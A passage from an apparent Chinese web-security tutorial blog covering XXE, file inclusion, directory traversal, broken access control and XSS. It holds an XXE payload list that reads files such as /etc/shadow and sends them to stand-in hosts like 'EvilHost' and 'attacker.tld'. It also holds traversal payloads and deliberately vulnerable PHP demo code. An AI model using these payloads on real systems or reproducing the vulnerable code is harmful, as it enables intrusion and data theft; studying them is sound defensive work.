]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>xxe</code>就是着段代码的变量，然后用<code>&amp;foo</code>标签输出<code>xxe</code></p><p>我们得到的结果就是：</p><p><img src="https://img1.imgtp.com/2023/09/21/Ml4XnbbQ.png"></p><p>可以看到成功显示了我们指定的变量，这可以说明输入的XML数据是有回显的</p><p>经过初步的判断，只是确定了可以返回XML数据，但不能确定他是否可以外部实体注入。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>比如我们是Windows的服务器，查看win.ini</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的命令 </p><p><code>file:///c:/windows/win.ini</code> 是一个文件路径，表示访问位于”C:\Windows\win.ini” 的本地文件。</p><p><img src="https://img1.imgtp.com/2023/09/21/ToBq3zC3.png"></p><p>如果到这步了，可以直接确定是XXE了</p><p>如果是Linux的话可以尝试</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></span></span></span></span><br></pre></td></tr></table></figure><p>最终有回显，那么就说明了存在该漏洞</p><p>更多的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla，用于验证出站 xxe 或盲 xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:443/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;sp;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">萃取</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:443/ev.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://x.x.x.x:443/?%data;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">上面的变体 (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:443/ev.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://x.x.x.x:443/?%data;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">data3</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/shadow&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://EvilHost:port/sp.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param3</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;ftp://Evilhost:port/%data3;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">data3</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:8080/ss5.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;file:///nothere/%payload;&quot;&gt;&#x27;</span>&gt;</span> %param1; %external;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">extra nice（另外更好的）</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">stuff</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml &quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://evil/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;%start;%stuff;%end;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">one</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.tld/dtd-part&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">  %one;</span></span><br><span class="line"><span class="meta">  %two;</span></span><br><span class="line"><span class="meta">  %four;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">three</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">two</span> <span class="string">&quot;&lt;!ENTITY % four SYSTEM &#x27;file:///%three;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: <span class="symbol">&amp;#x25;</span></span><br><span class="line"> </span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">asd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:4444/ext.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%asd;</span></span><br><span class="line"><span class="meta">%c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;rrr;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">## External dtd ##</span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/environ&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % c <span class="string">&quot;&lt;!ENTITY rrr SYSTEM &#x27;ftp://x.x.x.x:2121/%d;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line"><span class="meta">&lt;!DOCTYPE :. <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br></pre></td></tr></table></figure><h1 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于缺乏自动化的检测和应用程序开发人员缺乏有效 的功能测试，因而访问控制缺陷很常见。导致攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。</p><h2 id="主要包括："><a href="#主要包括：" class="headerlink" title="主要包括："></a>主要包括：</h2><ul><li>文件包含&#x2F;目录遍历</li><li>权限绕过（水平越权）</li><li>权限提升（垂直越权）</li><li>不安全直接对象的引用</li></ul><h2 id="文件包含-目录遍历"><a href="#文件包含-目录遍历" class="headerlink" title="文件包含&#x2F;目录遍历"></a>文件包含&#x2F;目录遍历</h2><h3 id="什么是文件包含？？？"><a href="#什么是文件包含？？？" class="headerlink" title="什么是文件包含？？？"></a>什么是文件包含？？？</h3><p>文件包含漏洞也是一种<code>注入型漏洞</code>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>就是说可以任意的访问服务器里面的文件，并且执行脚本</p><p>为什么会造成文件包含漏洞？</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用PHP JSP JSP等函数</span><br><span class="line"></span><br><span class="line">PHP：<span class="built_in">include</span>() 、<span class="built_in">include_once</span>()、<span class="built_in">require</span>()、<span class="built_in">require_once</span>()、<span class="built_in">fopen</span>()、<span class="built_in">readfile</span>()</span><br><span class="line"></span><br><span class="line">JSP/Servlet：ava<span class="selector-class">.io</span><span class="selector-class">.file</span>()、java<span class="selector-class">.io</span><span class="selector-class">.filereader</span>()</span><br><span class="line"></span><br><span class="line">ASP：include file、include virtual</span><br></pre></td></tr></table></figure><p>如果未对功能进行过滤，就产生文件包含漏洞</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>准备环境:php环境。</p><p>实验代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码 就是非常经典的文件包含漏洞，原理就是出在<code>include()</code>这个函数，服务端未进行过滤或禁止时，就产生文件包含漏洞</p><p>然后我们就可以对任意文件进行访问，</p><p>例如我们访问我们目录下的sssss.php</p><p><img src="https://img1.imgtp.com/2023/09/21/YrxPmyWX.png"></p><p>可以看到里面的内容，并且执行了php代码</p><p>可以说明了这个有文件包含漏洞！！！</p><p>甚至是其他的网站的PHP也可以输出出来，我们在另一个端口的站点在建立一个PHP</p><p>而且是无视文本格式的，不管你是不是PHP文件，</p><p><strong>例如:</strong></p><p>假设别的网站有PHP信息泄露</p><p><img src="https://img1.imgtp.com/2023/09/21/MnoSR7ty.png"></p><p><img src="https://img1.imgtp.com/2023/09/21/TSwaKAOv.png"></p><p>pyload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx<span class="regexp">/wj.php?file=phptest.com/</span>test.php</span><br></pre></td></tr></table></figure><h4 id="无视拓展名："><a href="#无视拓展名：" class="headerlink" title="无视拓展名："></a>无视拓展名：</h4><p>我们把PHP文件改成其他格式例如.dwd</p><p><img src="https://img1.imgtp.com/2023/09/21/OwjMjZJc.png"></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>其实就是 访问系统里的文件例如linux下的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx.com<span class="regexp">/wj.php?file=../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>文件包含需要配置 allow_url_include&#x3D;On(远程文件包含)、allow_url_fopen&#x3D;On(本地文件包含) 。所以，我们可以将其关闭，这样就可以杜绝文件包含漏洞了。但是，某些情况下，不能将其关闭，必须进行包含的话，我们可以使用白名单过滤的方法，只能包含我们指定的文件。这样，就可以杜绝文件包含漏洞了</p><h2 id="权限绕过（水平越权）"><a href="#权限绕过（水平越权）" class="headerlink" title="权限绕过（水平越权）"></a>权限绕过（水平越权）</h2><p>你一定见过不需要账号密码就可以直接进入后台管理，并且权限时 管理袁!!</p><p><strong>情境 #1：</strong> 应用程式在存取账户资讯的 SQL 呼叫中使用未经验证的资料：</p><blockquote><p>pstmt.setString(1, request.getParameter(“acct”));</p><p>ResultSet results &#x3D; pstmt.executeQuery( );</p></blockquote><p>攻击者只需修改浏览器的“acct”參数即可发送他们想要的任何账号。如果沒有正确验证，攻击者可以存取任何用户的账户。</p><p><a href="https://example.com/app/accountInfo?acct=notmyacct">https://example.com/app/accountInfo?acct=notmyacct</a></p><p><strong>情境#2：</strong> 攻击者仅強迫浏览某些目标网址。存取管理页面需要管理员权限。</p><blockquote><p><a href="https://example.com/app/getappInfo">https://example.com/app/getappInfo</a></p><p><a href="https://example.com/app/admin_getappInfo">https://example.com/app/admin_getappInfo</a></p></blockquote><p>上面时官方的案例</p><p>简单来说就是当你访问的时候，不是以游客的身份进去，直接变成里面的内部人员，就相当于武打片里面的间谍，危险度极高，拿下后台后有更多的权限，从而getshell</p><p>其他几种越权都是一个道理，地权限到高权限的过程，这就是失效的访问控制！！！</p>]]></content>
      
      
      <categories>
          
          <category> 常见漏洞 </category>
          
          <category> OWASP_TOP_10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 常见漏洞 </tag>
            
            <tag> OWASP </tag>
            
            <tag> 知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【第一章】常见漏洞OWASP_TOP_10</title>
      <link href="/2023/09/19/%E3%80%90%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/"/>
      <url>/2023/09/19/%E3%80%90%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/</url>
      
        <content type="html"><![CDATA[<h1 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h1><p>什么是常见的漏洞，就是<strong>OWASP TOP 10</strong>上发布的十大常见漏洞</p><h2 id="什么是OWASP-TOP-10"><a href="#什么是OWASP-TOP-10" class="headerlink" title="什么是OWASP TOP 10"></a>什么是OWASP TOP 10</h2><p>   <strong>OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。<br>其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</strong></p><p>接下来我们一一复现每一个漏洞：</p><h2 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h2><h3 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h3><p>反射型，DOM型，存储型</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型:"></a>反射型:</h3><p>首先了解<code>PHP</code>中的<code>$_GET </code>和 <code>$_POST</code></p><p>简单来讲，就是用来传参数的，对应GET或者POST请求</p><p>使用方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xss&#x27;</span>]; <span class="comment">#XSS为接收值</span></span><br></pre></td></tr></table></figure><p>构造反射型<code>XSS</code>漏洞</p><p>我们就用 GET请求举例子</p><p>简单来说就是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;xss&#x27;</span>])) &#123;</span><br><span class="line">    $xss = $_GET[<span class="string">&quot;xss&quot;</span>];</span><br><span class="line">    echo <span class="string">&#x27;name:&#x27;</span>,$xss;</span><br><span class="line">&#125;#获取一个<span class="variable constant_">GET</span>值为，并且赋值给变量$xss</span><br></pre></td></tr></table></figure><p>通过 echo来输出 GET请求的值，没有任何过滤的情况下，可以执行<code>Javascript</code>代码</p><p>通过简单的代码，我们可以构造一个简单的前端，<code>xss</code>常出现的搜索界面</p><p>尝试输入<code>Hello</code></p><p><img src="https://img1.imgtp.com/2023/09/18/uzn7tLWk.png"></p><p><code>echo</code>会将<code>GET参数</code>返回，所以产生<code>xss漏洞</code>；</p><p><img src="https://img1.imgtp.com/2023/09/18/3pgmpZlL.png"></p><p><img src="https://img1.imgtp.com/2023/09/18/KLdyxLh5.png"></p><h3 id="XSS存储型："><a href="#XSS存储型：" class="headerlink" title="XSS存储型："></a>XSS存储型：</h3><p>我们先不用数据库，直接用txt文件的方式存储，一般存储型的，都是存储数据库上的</p><p>简单的代码还原存储型<code>xss</code></p><p>出现地方：评论区，资料上传等</p><p>老规矩：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用get取值</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;comments&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $comments = $_GET[<span class="string">&#x27;comments&#x27;</span>];</span><br><span class="line">    $login = <span class="title function_">fopen</span>(<span class="string">&#x27;xss.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);  <span class="comment">//打开xss.txt文件</span></span><br><span class="line">    <span class="title function_">fwrite</span>($login, $comments.<span class="string">&quot;\r\n&quot;</span>);<span class="comment">//将get请求的写入xss.txt</span></span><br><span class="line">    <span class="title function_">fclose</span>($login);<span class="comment">//关闭文件</span></span><br><span class="line">    $url = <span class="string">&quot;xsscc.php&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content =&#x27;0.1;url=$url&#x27;&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">file_exists</span>(<span class="string">&#x27;xss.txt&#x27;</span>))&#123; <span class="comment">//判断文件xss.txt是否存在</span></span><br><span class="line">    $read = <span class="title function_">fopen</span>(<span class="string">&quot;xss.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//打开xss文件 &quot;r&quot;表示只读</span></span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_">feof</span>($read))&#123;</span><br><span class="line">        echo <span class="title function_">fgets</span>($read) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;<span class="comment">//输出read的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fclose</span>($read);</span><br><span 